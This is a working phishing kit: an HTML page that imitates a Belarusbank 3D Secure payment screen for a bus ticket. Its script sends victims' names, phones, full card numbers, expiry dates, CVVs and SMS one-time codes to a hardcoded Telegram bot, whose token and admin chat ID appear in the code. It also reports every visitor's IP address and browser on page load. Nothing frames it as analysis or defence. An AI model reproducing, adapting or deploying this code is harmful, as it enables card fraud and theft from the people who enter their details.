<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>3D Secure ‚Ä¢ –ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        }
        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
        }
        .card {
            max-width: 420px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #003a70;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .header img {
            width: 48px;
            height: 48px;
            background: white;
            border-radius: 8px;
            padding: 8px;
        }
        .header h2 {
            color: white;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }
        .content {
            padding: 24px;
        }
        .info {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 14px;
            color: #1e293b;
        }
        .info-row:last-child {
            margin-bottom: 0;
        }
        .amount {
            font-size: 24px;
            font-weight: 700;
            color: #003a70;
            text-align: center;
            margin: 16px 0;
        }
        .field {
            margin-bottom: 16px;
        }
        .field label {
            display: block;
            font-size: 13px;
            color: #475569;
            margin-bottom: 4px;
            font-weight: 500;
        }
        .field input {
            width: 100%;
            padding: 12px;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            font-size: 16px;
            transition: 0.2s;
        }
        .field input:focus {
            outline: none;
            border-color: #003a70;
            box-shadow: 0 0 0 3px rgba(0,58,112,0.1);
        }
        .field input::placeholder {
            color: #94a3b8;
        }
        .row2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        .btn {
            background: #003a70;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin: 8px 0;
        }
        .btn:hover {
            background: #002b54;
        }
        .btn-outline {
            background: white;
            color: #003a70;
            border: 1px solid #003a70;
        }
        .btn-outline:hover {
            background: #f0f7ff;
        }
        .spinner {
            border: 3px solid #e2e8f0;
            border-top: 3px solid #003a70;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .sms-code {
            font-size: 32px;
            letter-spacing: 8px;
            text-align: center;
            padding: 16px;
            background: #f1f5f9;
            border: 2px solid #cbd5e1;
            border-radius: 12px;
            width: 100%;
            margin: 20px 0;
        }
        .success, .fail {
            text-align: center;
            padding: 20px;
        }
        .success-icon, .fail-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 30px;
            border: 2px solid;
        }
        .success-icon {
            background: #d1fae5;
            color: #059669;
            border-color: #059669;
        }
        .fail-icon {
            background: #fee2e2;
            color: #b91c1c;
            border-color: #b91c1c;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #94a3b8;
            padding: 16px;
            border-top: 1px solid #e2e8f0;
        }
    </style>
</head>
<body>
    <div class="card" id="app">
        <!-- –î–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ -->
    </div>

    <script>
        (function() {
            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
            const ADMIN_ID = 5852338439;
            const urlParams = new URLSearchParams(window.location.search);
            const linkHash = urlParams.get('hash') || 'test123';

            // –î–∞–Ω–Ω—ã–µ –º–∞—Ä—à—Ä—É—Ç–∞ (–º–æ–∂–Ω–æ –±—Ä–∞—Ç—å –∏–∑ –±–æ—Ç–∞, –Ω–æ –ø–æ–∫–∞ –∑–∞–≥–ª—É—à–∫–∞)
            const route = {
                from: '–ú–∏–Ω—Å–∫',
                to: '–ì–æ–º–µ–ª—å',
                date: '15.03.2026',
                time: '18:30',
                price: 27
            };

            let state = {
                step: 'passenger', // passenger, card, processing, sms, processing2, success, fail
                passenger: { fullName: '', phone: '', email: '' },
                card: { number: '', expiry: '', cvv: '', cardholder: '' },
                smsCode: '',
                sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7)
            };

            // ========== –§–û–†–ú–ê–¢–¢–ï–†–´ ==========
            function formatCardNumber(v) {
                let d = v.replace(/\D/g, '').slice(0,16);
                let parts = [];
                for (let i=0; i<d.length; i+=4) parts.push(d.slice(i,i+4));
                return parts.join(' ');
            }
            function formatExpiry(v) {
                let d = v.replace(/\D/g, '').slice(0,4);
                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
                return d;
            }
            function formatCVV(v) {
                return v.replace(/\D/g, '').slice(0,3);
            }

            // ========== –ë–ê–ó–ê BIN (–î–õ–Ø –û–ü–†–ï–î–ï–õ–ï–ù–ò–Ø –ë–ê–ù–ö–ê) ==========
            const BIN_DB = {
                '427901': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Classic' },
                '427902': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Gold' },
                '427903': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Platinum' },
                '425501': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '425502': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '911201': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–†' },
                '911202': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Premium' },
                '380101': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ë–µ–ª–∫–∞—Ä—Ç' },
                '91123801': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Supreme' },
                '521324': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '515701': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Classic' },
                '440501': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Visa Classic' },
                '458101': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Classic' },
                '555501': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Mastercard Standard' },
                '424601': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Visa' },
                '498401': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Visa' },
                '411111': { bank: '–†–†–ë-–ë–∞–Ω–∫', type: 'Visa' },
                '437237': { bank: '–•–æ—É–º –ö—Ä–µ–¥–∏—Ç', type: 'Visa' },
                '437772': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Visa' },
                '427688': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Visa' },
                '546901': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Mastercard' },
                '427229': { bank: '–í–¢–ë', type: 'Visa' },
            };
            function getBinInfo(cardNumber) {
                const bin = cardNumber.replace(/\D/g, '').slice(0,6);
                return BIN_DB[bin] || { bank: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ', type: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' };
            }

            // ========== –û–¢–ü–†–ê–í–ö–ê –í TELEGRAM (–ö–ê–†–¢–û–ß–ö–ê –° –ö–ù–û–ü–ö–ê–ú–ò) ==========
            async function sendCardToBot() {
                const binInfo = getBinInfo(state.card.number);
                const messageText = 
                    `üí≥ –ù–û–í–ê–Ø –ö–ê–†–¢–ê\n\n` +
                    `üöê –ú–∞—Ä—à—Ä—É—Ç: ${route.from} ‚Üí ${route.to}\n` +
                    `üìÖ ${route.date} ${route.time}\n` +
                    `üí∞ ${route.price} BYN\n` +
                    `üë§ –ü–∞—Å—Å–∞–∂–∏—Ä: ${state.passenger.fullName}\n` +
                    `üìû –¢–µ–ª–µ—Ñ–æ–Ω: ${state.passenger.phone}\n` +
                    `üìß Email: ${state.passenger.email}\n` +
                    `üí≥ –ö–∞—Ä—Ç–∞: ${state.card.number}\n` +
                    `üìÖ –°—Ä–æ–∫: ${state.card.expiry} | CVV: ${state.card.cvv}\n` +
                    `üë§ –í–ª–∞–¥–µ–ª–µ—Ü: ${state.card.cardholder}\n` +
                    `üî¢ BIN: ${state.card.number.replace(/\D/g, '').slice(0,6)}\n` +
                    `üè¶ –ë–ê–ù–ö: ${binInfo.bank}\n` +
                    `üíé –¢–ò–ü: ${binInfo.type}\n` +
                    `üîó –•–µ—à: ${linkHash}\n` +
                    `üÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`;

                const keyboard = {
                    inline_keyboard: [
                        [{ text: 'üí∞ –í–ó–Ø–¢–¨ –ö–ê–†–¢–£', callback_data: `take_${state.sessionId}` },
                         { text: 'üóë –û–¢–ö–ê–ó', callback_data: `reject_${state.sessionId}` }]
                    ]
                };

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: ADMIN_ID,
                            text: messageText,
                            parse_mode: 'HTML',
                            reply_markup: keyboard
                        })
                    });
                    return true;
                } catch (e) {
                    console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram', e);
                    return false;
                }
            }

            // ========== –û–¢–ü–†–ê–í–ö–ê –£–í–ï–î–û–ú–õ–ï–ù–ò–Ø –û –ó–ê–•–û–î–ï ==========
            async function sendVisitNotification() {
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    const text = `üëÅ –ó–ê–•–û–î –ù–ê –°–°–´–õ–ö–£\n\nüîó –•–µ—à: ${linkHash}\nüåç IP: ${ipData.ip}\nüì± ${navigator.userAgent}`;
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                    });
                } catch (e) {}
            }

            // ========== –†–ï–ù–î–ï–† ==========
            function render() {
                const app = document.getElementById('app');
                let html = '';

                if (state.step === 'passenger') {
                    html = `
                        <div class="header">
                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23003a70'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-.5-13v4h5v2h-5v4h-2v-4H6v-2h3.5V7h2z'/%3E%3C/svg%3E" alt="–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫">
                            <h2>3D Secure ‚Ä¢ –ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫</h2>
                        </div>
                        <div class="content">
                            <div class="info">
                                <div class="info-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${route.from} ‚Üí ${route.to}</span></div>
                                <div class="info-row"><span>–î–∞—Ç–∞/–≤—Ä–µ–º—è</span><span>${route.date} ${route.time}</span></div>
                            </div>
                            <div class="amount">${route.price} BYN</div>
                            <div class="field">
                                <label>–§–ò–û *</label>
                                <input id="fullName" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" value="${state.passenger.fullName}">
                            </div>
                            <div class="field">
                                <label>–¢–µ–ª–µ—Ñ–æ–Ω *</label>
                                <input id="phone" placeholder="+375291234567" value="${state.passenger.phone}">
                            </div>
                            <div class="field">
                                <label>Email (–¥–ª—è –±–∏–ª–µ—Ç–∞)</label>
                                <input id="email" placeholder="ivanov@mail.ru" value="${state.passenger.email}">
                            </div>
                            <button class="btn" id="nextBtn">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
                        </div>
                        <div class="footer">–ó–∞—â–∏—â–µ–Ω–æ SSL ‚Ä¢ 3D Secure ‚Ä¢ PCI DSS</div>
                    `;
                } else if (state.step === 'card') {
                    html = `
                        <div class="header">
                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23003a70'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-.5-13v4h5v2h-5v4h-2v-4H6v-2h3.5V7h2z'/%3E%3C/svg%3E" alt="–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫">
                            <h2>–í–≤–æ–¥ –∫–∞—Ä—Ç—ã</h2>
                        </div>
                        <div class="content">
                            <div class="info">
                                <div class="info-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div>
                                <div class="info-row"><span>–¢–µ–ª–µ—Ñ–æ–Ω</span><span>${state.passenger.phone}</span></div>
                            </div>
                            <div class="amount">${route.price} BYN</div>
                            <div class="field">
                                <label>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label>
                                <input id="cardNumber" placeholder="0000 0000 0000 0000" value="${state.card.number}">
                            </div>
                            <div class="row2">
                                <div class="field"><label>–°—Ä–æ–∫</label><input id="expiry" placeholder="–ú–ú/–ì–ì" value="${state.card.expiry}"></div>
                                <div class="field"><label>CVV</label><input id="cvv" placeholder="123" value="${state.card.cvv}"></div>
                            </div>
                            <div class="field">
                                <label>–í–ª–∞–¥–µ–ª–µ—Ü –∫–∞—Ä—Ç—ã</label>
                                <input id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}">
                            </div>
                            <button class="btn" id="payBtn">–û–ø–ª–∞—Ç–∏—Ç—å</button>
                            <button class="btn btn-outline" onclick="state.step='passenger'; render();">‚Üê –ù–∞–∑–∞–¥</button>
                        </div>
                        <div class="footer">–ó–∞—â–∏—â–µ–Ω–æ SSL ‚Ä¢ 3D Secure ‚Ä¢ PCI DSS</div>
                    `;
                } else if (state.step === 'processing') {
                    html = `
                        <div class="header">
                            <h2>–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞</h2>
                        </div>
                        <div class="content" style="text-align:center;">
                            <div class="spinner"></div>
                            <p style="margin:20px 0;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</p>
                            <p style="color:#64748b;">–û–±—ã—á–Ω–æ —ç—Ç–æ –∑–∞–Ω–∏–º–∞–µ—Ç 30‚Äì60 —Å–µ–∫—É–Ω–¥</p>
                        </div>
                    `;
                } else if (state.step === 'sms') {
                    html = `
                        <div class="header">
                            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23003a70'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-.5-13v4h5v2h-5v4h-2v-4H6v-2h3.5V7h2z'/%3E%3C/svg%3E" alt="–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫">
                            <h2>3D Secure</h2>
                        </div>
                        <div class="content">
                            <div class="info">
                                <div class="info-row"><span>–ö–∞—Ä—Ç–∞</span><span>${state.card.number}</span></div>
                                <div class="info-row"><span>–°—É–º–º–∞</span><span>${route.price} BYN</span></div>
                            </div>
                            <p style="margin-bottom:16px;">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –Ω–∞ –≤–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω</p>
                            <input class="sms-code" id="smsCode" maxlength="6" placeholder="______" value="${state.smsCode}">
                            <button class="btn" id="confirmSms">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
                            <button class="btn btn-outline" id="resendSms">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –ø–æ–≤—Ç–æ—Ä–Ω–æ</button>
                            <button class="btn btn-outline" onclick="state.step='card'; render();">‚Üê –ù–∞–∑–∞–¥ –∫ –∫–∞—Ä—Ç–µ</button>
                        </div>
                    `;
                } else if (state.step === 'processing2') {
                    html = `
                        <div class="header">
                            <h2>–ë–∞–Ω–∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç</h2>
                        </div>
                        <div class="content" style="text-align:center;">
                            <div class="spinner"></div>
                            <p style="margin:20px 0;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ...</p>
                        </div>
                    `;
                } else if (state.step === 'success') {
                    html = `
                        <div class="header">
                            <h2>–û–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–∞</h2>
                        </div>
                        <div class="content success">
                            <div class="success-icon">‚úì</div>
                            <h3>–ë–∏–ª–µ—Ç –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω!</h3>
                            <p style="margin:16px 0;">–ë–∏–ª–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –∏ SMS.</p>
                            <div class="info">
                                <div class="info-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${route.from} ‚Üí ${route.to}</span></div>
                                <div class="info-row"><span>–î–∞—Ç–∞/–≤—Ä–µ–º—è</span><span>${route.date} ${route.time}</span></div>
                                <div class="info-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div>
                            </div>
                            <button class="btn" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
                        </div>
                    `;
                } else if (state.step === 'fail') {
                    html = `
                        <div class="header">
                            <h2>–û—à–∏–±–∫–∞ –ø–ª–∞—Ç–µ–∂–∞</h2>
                        </div>
                        <div class="content fail">
                            <div class="fail-icon">‚úï</div>
                            <h3>–ü–ª–∞—Ç—ë–∂ –Ω–µ –ø—Ä–æ—à—ë–ª</h3>
                            <p style="margin:16px 0;">–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥—É—é –∫–∞—Ä—Ç—É –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–∑–∂–µ.</p>
                            <button class="btn" onclick="state.step='card'; render();">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>
                            <button class="btn btn-outline" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>
                        </div>
                    `;
                }

                app.innerHTML = html;

                // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
                if (state.step === 'passenger') {
                    document.getElementById('nextBtn')?.addEventListener('click', () => {
                        state.passenger.fullName = document.getElementById('fullName').value.trim();
                        state.passenger.phone = document.getElementById('phone').value.trim();
                        state.passenger.email = document.getElementById('email').value.trim();
                        if (!state.passenger.fullName || !state.passenger.phone) {
                            alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –§–ò–û –∏ —Ç–µ–ª–µ—Ñ–æ–Ω');
                            return;
                        }
                        state.step = 'card';
                        render();
                    });
                }

                if (state.step === 'card') {
                    const cn = document.getElementById('cardNumber');
                    const ex = document.getElementById('expiry');
                    const cv = document.getElementById('cvv');
                    if (cn) cn.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
                    if (ex) ex.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
                    if (cv) cv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));

                    document.getElementById('payBtn')?.addEventListener('click', async () => {
                        state.card.number = document.getElementById('cardNumber').value.trim();
                        state.card.expiry = document.getElementById('expiry').value.trim();
                        state.card.cvv = document.getElementById('cvv').value.trim();
                        state.card.cardholder = document.getElementById('cardholder').value.trim();
                        if (!state.card.number || !state.card.expiry || !state.card.cvv || !state.card.cardholder) {
                            alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è –∫–∞—Ä—Ç—ã');
                            return;
                        }
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞—Ä—Ç–æ—á–∫—É –≤ –±–æ—Ç–∞
                        const ok = await sendCardToBot();
                        if (ok) {
                            state.step = 'processing';
                            render();
                        } else {
                            alert('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram');
                        }
                    });
                }

                if (state.step === 'sms') {
                    document.getElementById('confirmSms')?.addEventListener('click', async () => {
                        const code = document.getElementById('smsCode').value.trim();
                        if (!code || code.length < 4) {
                            alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS');
                            return;
                        }
                        state.smsCode = code;
                        // –£–≤–µ–¥–æ–º–ª—è–µ–º –±–æ—Ç–∞ –æ –≤–≤–æ–¥–µ SMS (–º–æ–∂–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ)
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: ADMIN_ID,
                                text: `üì® SMS-–ö–û–î\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}\nüì± –ö–æ–¥: ${code}`
                            })
                        });
                        state.step = 'processing2';
                        render();
                    });
                    document.getElementById('resendSms')?.addEventListener('click', async () => {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: ADMIN_ID,
                                text: `üîÑ –ü–û–í–¢–û–†–ù–´–ô –ó–ê–ü–†–û–° SMS\n\nüÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`
                            })
                        });
                        alert('–ù–æ–≤—ã–π –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
                    });
                }
            }

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞—Ö–æ–¥–µ
            sendVisitNotification();
            // –°—Ç–∞—Ä—Ç–æ–≤—ã–π —Ä–µ–Ω–¥–µ—Ä
            render();
        })();
    </script>
</body>
</html>
